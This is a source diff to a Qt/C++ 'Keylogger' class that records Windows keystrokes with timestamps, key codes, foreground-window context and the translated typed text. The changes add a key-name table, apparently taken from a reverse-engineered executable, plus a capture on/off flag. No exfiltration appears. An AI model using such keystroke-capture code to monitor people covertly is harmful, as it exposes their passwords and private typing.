@@ -1,6 +1,7 @@
 #include "keylogger.h"
 
 #include <QDateTime>
+#include <QHash>
 #include <QJsonObject>
 
 #include <string>
@@ -124,6 +125,46 @@ int evdevCode(const KBDLLHOOKSTRUCT &info)
     }
 }
 
+// The key's name, as the original names evdev codes (viewer.exe's
+// FUN_1404e5660 table -- the names its own Translator uses); "UNKNOWN"
+// for any other code.
+QString evdevName(int code)
+{
+    static const QHash<int, const char *> kNames = [] {
+        QHash<int, const char *> names;
+        const std::pair<int, const char *> table[] = {
+            {1, "ESC"}, {2, "1"}, {3, "2"}, {4, "3"}, {5, "4"}, {6, "5"}, {7, "6"}, {8, "7"}, {9, "8"},
+            {10, "9"}, {0x0b, "0"}, {0x0c, "MINUS"}, {0x0d, "EQUAL"}, {0x0e, "BACKSPACE"}, {0x0f, "TAB"},
+            {0x10, "Q"}, {0x11, "W"}, {0x12, "E"}, {0x13, "R"}, {0x14, "T"}, {0x15, "Y"}, {0x16, "U"},
+            {0x17, "I"}, {0x18, "O"}, {0x19, "P"}, {0x1a, "LEFTBRACE"}, {0x1b, "RIGHTBRACE"},
+            {0x1c, "ENTER"}, {0x1d, "LEFTCTRL"}, {0x1e, "A"}, {0x1f, "S"}, {0x20, "D"}, {0x21, "F"},
+            {0x22, "G"}, {0x23, "H"}, {0x24, "J"}, {0x25, "K"}, {0x26, "L"}, {0x27, "SEMICOLON"},
+            {0x28, "APOSTROPHE"}, {0x29, "GRAVE"}, {0x2a, "LEFTSHIFT"}, {0x2b, "BACKSLASH"}, {0x2c, "Z"},
+            {0x2d, "X"}, {0x2e, "C"}, {0x2f, "V"}, {0x30, "B"}, {0x31, "N"}, {0x32, "M"}, {0x33, "COMMA"},
+            {0x34, "DOT"}, {0x35, "SLASH"}, {0x36, "RIGHTSHIFT"}, {0x37, "KPASTERISK"}, {0x38, "LEFTALT"},
+            {0x39, "SPACE"}, {0x3a, "CAPSLOCK"}, {0x3b, "F1"}, {0x3c, "F2"}, {0x3d, "F3"}, {0x3e, "F4"},
+            {0x3f, "F5"}, {0x40, "F6"}, {0x41, "F7"}, {0x42, "F8"}, {0x43, "F9"}, {0x44, "F10"},
+            {0x45, "NUMLOCK"}, {0x46, "SCROLLLOCK"}, {0x47, "KP7"}, {0x48, "KP8"}, {0x49, "KP9"},
+            {0x4a, "KPMINUS"}, {0x4b, "KP4"}, {0x4c, "KP5"}, {0x4d, "KP6"}, {0x4e, "KPPLUS"}, {0x4f, "KP1"},
+            {0x50, "KP2"}, {0x51, "KP3"}, {0x52, "KP0"}, {0x53, "KPDOT"}, {0x57, "F11"}, {0x58, "F12"},
+            {0x5a, "KATAKANA"}, {0x5b, "HIRAGANA"}, {0x60, "KPENTER"}, {0x61, "RIGHTCTRL"},
+            {0x62, "KPSLASH"}, {0x63, "SYSRQ"}, {0x64, "RIGHTALT"}, {0x66, "HOME"}, {0x67, "UP"},
+            {0x68, "PAGEUP"}, {0x69, "LEFT"}, {0x6a, "RIGHT"}, {0x6b, "END"}, {0x6c, "DOWN"},
+            {0x6d, "PAGEDOWN"}, {0x6e, "INSERT"}, {0x6f, "DELETE"}, {0x71, "MUTE"}, {0x72, "VOLUMEDOWN"},
+            {0x73, "VOLUMEUP"}, {0x77, "PAUSE"}, {0x7d, "LEFTMETA"}, {0x7e, "RIGHTMETA"}, {0x7f, "COMPOSE"},
+            {0x8a, "HELP"}, {0x8e, "SLEEP"}, {0xa3, "NEXTSONG"}, {0xa4, "PLAYPAUSE"}, {0xa5, "PREVIOUSSONG"},
+            {0xa6, "STOPCD"}, {0xb7, "F13"}, {0xb8, "F14"}, {0xb9, "F15"}, {0xba, "F16"}, {0xbb, "F17"},
+            {0xbc, "F18"}, {0xbd, "F19"}, {0xbe, "F20"}, {0xbf, "F21"}, {0xc0, "F22"}, {0xc1, "F23"},
+            {0xc2, "F24"}, {0xd2, "PRINT"},
+        };
+        for (const auto &entry : table) {
+            names.insert(entry.first, entry.second);
+        }
+        return names;
+    }();
+    return QString::fromLatin1(kNames.value(code, "UNKNOWN"));
+}
+
 // The text the key produces in the foreground window's keyboard layout
 // with the current Shift / AltGr / CapsLock state -- printable characters
 // only (control characters, e.g. with Ctrl held, give nothing).
@@ -185,6 +226,9 @@ void Keylogger::handleKey(const KBDLLHOOKSTRUCT &info, bool down)
     if (down) {
         noteActivity();
     }
+    if (!m_captureKeys) {
+        return;
+    }
     const int code = evdevCode(info);
     int type = 3; // release
     if (down) {
@@ -196,7 +240,8 @@ void Keylogger::handleKey(const KBDLLHOOKSTRUCT &info, bool down)
     HWND window = GetForegroundWindow();
     QJsonObject event{{QStringLiteral("t"), static_cast<double>(QDateTime::currentMSecsSinceEpoch())},
                       {QStringLiteral("k"), type},
-                      {QStringLiteral("c"), code}};
+                      {QStringLiteral("c"), code},
+                      {QStringLiteral("n"), evdevName(code)}};
     if (down) {
         const QString text = translatedText(info, window);
         if (!text.isEmpty()) {
